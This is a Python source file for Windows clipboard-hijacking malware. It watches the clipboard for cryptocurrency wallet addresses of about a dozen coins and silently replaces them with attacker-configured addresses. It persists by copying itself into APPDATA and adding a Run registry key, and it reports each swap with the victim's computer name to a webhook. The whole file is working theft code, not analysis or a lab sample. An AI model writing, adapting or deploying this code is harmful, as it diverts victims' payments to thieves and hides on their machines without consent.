import http.client
import pyperclip
import socket
import winreg
import shutil
import json
import time
import sys
import re
import os

btcaddr = "SET BTC ADDRESS HERE"
ethaddr = "SET ETH ADDRESS HERE"
ltcaddr = "SET LTC ADDRESS HERE"
xmraddr = "SET XMR ADDRESS HERE"
soladdr = "SET SOL ADDRESS HERE"
dogeaddr = "SET DOGE ADDRESS HERE"
bnbaddr = "SET BNB ADDRESS HERE"
baseaddr = "SET BASE ADDRESS HERE"
adaaddr = "SET ADA ADDRESS HERE"
dotaddr = "SET DOT ADDRESS HERE"
xrpaddr = "SET XRP ADDRESS HERE"
trxaddr = "SET TRX ADDRESS HERE"

single_use = False

ping = False
webhook_url = ""

webhook_parts = webhook_url.replace("https://", "").split("/")
host = webhook_parts[0]
url_path = "/" + "/".join(webhook_parts[1:])

headers = {
    'Content-Type': 'application/json'
}

comp_name = socket.gethostname()

def is_crypto_addr(clipboard_text):
    try:
        btc_address_pattern = r"^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$"
        eth_address_pattern = r"^(0x)?[0-9a-fA-F]{40}$"
        ltc_address_pattern = r"^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$"
        xmr_address_pattern = r"^4[0-9AB][0-9a-zA-Z]{93}$"
        sol_address_pattern = r"^[1-9A-HJ-NP-Za-km-z]{32,44}$"
        doge_address_pattern = r"^D[5-9A-HJ-NP-Ua-km-z]{33,34}$"
        bnb_address_pattern = r"^bnb1[0-9a-z]{38}$"
        base_address_pattern = r"^0x[a-fA-F0-9]{40}$"
        ada_address_pattern = r"^addr1[0-9a-z]{58,59}$"
        dot_address_pattern = r"^1[a-km-zA-HJ-NP-Z1-9]{47}$"
        xrp_address_pattern = r"^r[1-9A-HJ-NP-Za-km-z]{25,35}$"
        trx_address_pattern = r"^T[1-9A-HJ-NP-Za-km-z]{33}$"

        if re.match(btc_address_pattern, clipboard_text):
            return "BTC"
        elif re.match(eth_address_pattern, clipboard_text):
            return "ETH"
        elif re.match(ltc_address_pattern, clipboard_text):
            return "LTC"
        elif re.match(xmr_address_pattern, clipboard_text):
            return "XMR"
        elif re.match(sol_address_pattern, clipboard_text):
            return "SOL"
        elif re.match(doge_address_pattern, clipboard_text):
            return "DOGE"
        elif re.match(bnb_address_pattern, clipboard_text):
            return "BNB"
        elif re.match(base_address_pattern, clipboard_text):
            return "BASE"
        elif re.match(ada_address_pattern, clipboard_text):
            return "ADA"
        elif re.match(dot_address_pattern, clipboard_text):
            return "DOT"
        elif re.match(xrp_address_pattern, clipboard_text):
            return "XRP"
        elif re.match(trx_address_pattern, clipboard_text):
            return "TRX"
        else:
            return False
    except Exception:
        return False

def main():
    while True:
        try:
            clipboard_text = pyperclip.paste()
            var = is_crypto_addr(clipboard_text)

            if var == "BTC":
                if btcaddr != "SET BTC ADDRESS HERE":
                    if clipboard_text != btcaddr:
                        pyperclip.copy(btcaddr)
                        if single_use:
                                with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
                                    o.write("True")
                                    o.close()
                                sys.exit()
                        if webhook_url != "":
                                if ping:
                                    message = {
                                    "content": f"@everyone```\ndetected BTC address on {comp_name} - changed to {btcaddr}\n```"
                                    }
                                else:
                                    message = {
                                        "content": f"```\ndetected BTC address on {comp_name} - changed to {btcaddr}\n```"
                                    }

                                json_data = json.dumps(message)

                                conn = http.client.HTTPSConnection(host)
                                conn.request("POST", url_path, json_data, headers)

                                response = conn.getresponse()

                                response.read()
                                conn.close()
            elif var == "ETH":
                if ethaddr != "SET ETH ADDRESS HERE":
                    if clipboard_text != ethaddr:
                        pyperclip.copy(ethaddr)
                        if single_use:
                                with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
                                    o.write("True")
                                    o.close()
                                sys.exit()
                        if webhook_url != "":
                                if ping:
                                    message = {
                                    "content": f"@everyone```\ndetected ETH address on {comp_name} - changed to {ethaddr}\n```"
                                    }
                                else:
                                    message = {
                                        "content": f"```\ndetected ETH address on {comp_name} - changed to {ethaddr}\n```"
                                    }

                                json_data = json.dumps(message)

                                conn = http.client.HTTPSConnection(host)
                                conn.request("POST", url_path, json_data, headers)

                                response = conn.getresponse()

                                response.read()
                                conn.close()
            elif var == "LTC":
                if ltcaddr != "SET LTC ADDRESS HERE":
                    if clipboard_text != ltcaddr:
                        pyperclip.copy(ltcaddr)
                        if single_use:
                                with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
                                    o.write("True")
                                    o.close()
                                sys.exit()
                        if webhook_url != "":
                                if ping:
                                    message = {
                                    "content": f"@everyone```\ndetected LTC address on {comp_name} - changed to {ltcaddr}\n```"
                                    }
                                else:
                                    message = {
                                        "content": f"```\ndetected LTC address on {comp_name} - changed to {ltcaddr}\n```"
                                    }

                                json_data = json.dumps(message)

                                conn = http.client.HTTPSConnection(host)
                                conn.request("POST", url_path, json_data, headers)

                                response = conn.getresponse()

                                response.read()
                                conn.close()
            elif var == "XMR":
                if xmraddr != "SET XMR ADDRESS HERE":
                    if clipboard_text != xmraddr:
                        pyperclip.copy(xmraddr)
                        if single_use:
                                with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
                                    o.write("True")
                                    o.close()
                                sys.exit()
                        if webhook_url != "":
                                if ping:
                                    message = {
                                    "content": f"@everyone```\ndetected XMR address on {comp_name} - changed to {xmraddr}\n```"
                                    }
                                else:
                                    message = {
                                        "content": f"```\ndetected XMR address on {comp_name} - changed to {xmraddr}\n```"
                                    }

                                json_data = json.dumps(message)

                                conn = http.client.HTTPSConnection(host)
                                conn.request("POST", url_path, json_data, headers)

                                response = conn.getresponse()

                                response.read()
                                conn.close()
            elif var == "SOL":
                if soladdr != "SET SOL ADDRESS HERE":
                    if clipboard_text != soladdr:
                        pyperclip.copy(soladdr)
                        if single_use:
                                with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
                                    o.write("True")
                                    o.close()
                                sys.exit()
                        if webhook_url != "":
                                if ping:
                                    message = {
                                    "content": f"@everyone```\ndetected SOL address on {comp_name} - changed to {soladdr}\n```"
                                    }
                                else:
                                    message = {
                                        "content": f"```\ndetected SOL address on {comp_name} - changed to {soladdr}\n```"
                                    }

                                json_data = json.dumps(message)

                                conn = http.client.HTTPSConnection(host)
                                conn.request("POST", url_path, json_data, headers)

                                response = conn.getresponse()

                                response.read()
                                conn.close()
            elif var == "DOGE":
                if dogeaddr != "SET DOGE ADDRESS HERE":
                    if clipboard_text != dogeaddr:
                        pyperclip.copy(dogeaddr)
                        if single_use:
                                with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
                                    o.write("True")
                                    o.close()
                                sys.exit()
                        if webhook_url != "":
                                if ping:
                                    message = {
                                    "content": f"@everyone```\ndetected DOGE address on {comp_name} - changed to {dogeaddr}\n```"
                                    }
                                else:
                                    message = {
                                        "content": f"```\ndetected DOGE address on {comp_name} - changed to {dogeaddr}\n```"
                                    }

                                json_data = json.dumps(message)

                                conn = http.client.HTTPSConnection(host)
                                conn.request("POST", url_path, json_data, headers)

                                response = conn.getresponse()

                                response.read()
                                conn.close()
            elif var == "BNB":
                if bnbaddr != "SET BNB ADDRESS HERE":
                    if clipboard_text != bnbaddr:
                        pyperclip.copy(bnbaddr)
                        if single_use:
                                with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
                                    o.write("True")
                                    o.close()
                                sys.exit()
                        if webhook_url != "":
                                if ping:
                                    message = {
                                    "content": f"@everyone```\ndetected BNB address on {comp_name} - changed to {bnbaddr}\n```"
                                    }
                                else:
                                    message = {
                                        "content": f"```\ndetected BNB address on {comp_name} - changed to {bnbaddr}\n```"
                                    }

                                json_data = json.dumps(message)

                                conn = http.client.HTTPSConnection(host)
                                conn.request("POST", url_path, json_data, headers)

                                response = conn.getresponse()

                                response.read()
                                conn.close()
            elif var == "BASE":
                if baseaddr != "SET BASE ADDRESS HERE":
                    if clipboard_text != baseaddr:
                        pyperclip.copy(baseaddr)
                        if single_use:
                                with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
                                    o.write("True")
                                    o.close()
                                sys.exit()
                        if webhook_url != "":
                                if ping:
                                    message = {
                                    "content": f"@everyone```\ndetected BASE address on {comp_name} - changed to {baseaddr}\n```"
                                    }
                                else:
                                    message = {
                                        "content": f"```\ndetected BASE address on {comp_name} - changed to {baseaddr}\n```"
                                    }

                                json_data = json.dumps(message)

                                conn = http.client.HTTPSConnection(host)
                                conn.request("POST", url_path, json_data, headers)

                                response = conn.getresponse()

                                response.read()
                                conn.close()
            elif var == "ADA":
                if adaaddr != "SET ADA ADDRESS HERE":
                    if clipboard_text != adaaddr:
                        pyperclip.copy(adaaddr)
                        if single_use:
                                with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
                                    o.write("True")
                                    o.close()
                                sys.exit()
                        if webhook_url != "":
                                if ping:
                                    message = {
                                    "content": f"@everyone```\ndetected ADA address on {comp_name} - changed to {adaaddr}\n```"
                                    }
                                else:
                                    message = {
                                        "content": f"```\ndetected ADA address on {comp_name} - changed to {adaaddr}\n```"
                                    }

                                json_data = json.dumps(message)

                                conn = http.client.HTTPSConnection(host)
                                conn.request("POST", url_path, json_data, headers)

                                response = conn.getresponse()

                                response.read()
                                conn.close()
            elif var == "DOT":
                if dotaddr != "SET DOT ADDRESS HERE":
                    if clipboard_text != dotaddr:
                        pyperclip.copy(dotaddr)
                        if single_use:
                                with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
                                    o.write("True")
                                    o.close()
                                sys.exit()
                        if webhook_url != "":
                                if ping:
                                    message = {
                                    "content": f"@everyone```\ndetected DOT address on {comp_name} - changed to {dotaddr}\n```"
                                    }
                                else:
                                    message = {
                                        "content": f"```\ndetected DOT address on {comp_name} - changed to {dotaddr}\n```"
                                    }

                                json_data = json.dumps(message)

                                conn = http.client.HTTPSConnection(host)
                                conn.request("POST", url_path, json_data, headers)

                                response = conn.getresponse()

                                response.read()
                                conn.close()
            else:
                pass
        except Exception:
            pass
        time.sleep(0.15)

def dupe_self():
    try:
        current_script = os.path.abspath(sys.executable)
        appdata_path = os.environ['APPDATA']
        duplicate_directory = os.path.join(appdata_path, 'CLPPTH')
        os.makedirs(duplicate_directory, exist_ok=True)
        duplicate_script = os.path.join(duplicate_directory, "clppth.exe")
        shutil.copyfile(current_script, duplicate_script)
        return duplicate_script
    except Exception:
        return None

def add_reg(dupe_path):
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.HKEY_CURRENT_USER
        with winreg.OpenKey(key, key_path, 0, winreg.KEY_ALL_ACCESS) as reg_key:
            try:
                winreg.QueryValueEx(reg_key, "CLPPTH")
            except FileNotFoundError:
                winreg.SetValueEx(reg_key, "CLPPTH", 0, winreg.REG_SZ, dupe_path)
    except Exception:
        pass

def check():
    try:
        folder_name = "Storage0"
        appdata_path = os.environ['APPDATA']
        folder_path = os.path.join(appdata_path, folder_name)
        if not os.path.exists(os.path.join(folder_path, "storage.txt")):
            os.makedirs(folder_path, exist_ok=True)
            with open(os.path.join(folder_path, "storage.txt"), "w"):
                pass
            dupe_path = dupe_self()
            if dupe_path:
                add_reg(dupe_path)
                main()
        else:
            with open(os.path.join(folder_path, "storage.txt"), "r") as o:
                ln1 = o.readline().strip('\n')
                if ln1 != "True":
                    main()
                else:
                    try:
                        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                        key = winreg.HKEY_CURRENT_USER
                        with winreg.OpenKey(key, key_path, 0, winreg.KEY_ALL_ACCESS) as reg_key:
                            winreg.DeleteValue(reg_key, "CLPPTH")
                    except Exception:
                        pass
    except Exception:
        pass
    
if __name__ == "__main__":
    check()